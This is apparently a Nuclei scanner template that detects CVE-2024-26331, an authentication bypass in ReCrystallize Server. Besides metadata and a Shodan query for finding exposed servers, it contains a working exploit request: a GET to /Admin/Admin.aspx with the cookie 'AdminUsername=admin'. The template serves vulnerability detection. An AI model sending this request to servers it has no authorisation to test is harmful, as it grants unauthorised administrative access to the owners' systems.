id: CVE-2024-26331

info:
  name: ReCrystallize Server - Authentication Bypass
  author: Carson Chan
  severity: high
  description: |
    This vulnerability allows an attacker to bypass authentication in the ReCrystallize Server application by manipulating the 'AdminUsername' cookie. This gives the attacker administrative access to the application's functionality, even when the default password has been changed.
  impact: |
    Unauthenticated attackers can bypass authentication by manipulating the AdminUsername cookie to gain administrative access to ReCrystallize Server.
  remediation: |
    Update ReCrystallize Server to a patched version that addresses CVE-2024-26331.
  reference:
    - https://preview.sensepost.com/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/
    - https://sensepost.com/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/
    - https://www.recrystallize.com/merchant/ReCrystallize-Server-for-Crystal-Reports.htm
    - https://github.com/Ostorlab/KEV
  classification:
    epss-score: 0.67864
    epss-percentile: 0.98544
  metadata:
    verified: true
    max-request: 1
    shodan-query: title:"ReCrystallize"
  tags: cve,recrystallize,auth-bypass,cve2024,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/Admin/Admin.aspx"
    headers:
      Cookie: "AdminUsername=admin"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "ReCrystallize Server Administration"
          - "License Status:"
          - "System Info</a>"
        condition: and

      - type: status
        status:
          - 200
# digest: 4a0a00473045022100ae8805a07bd9ab93fb5a940328aad2fdfa54cdba70e89354fb27684ab4a7282f02206868cd136a338ed1b9be6927de56c0b76ca1f66ab7510e55f2f3cf8c93ea961c:922c64590222798bb761d5b6d8e72950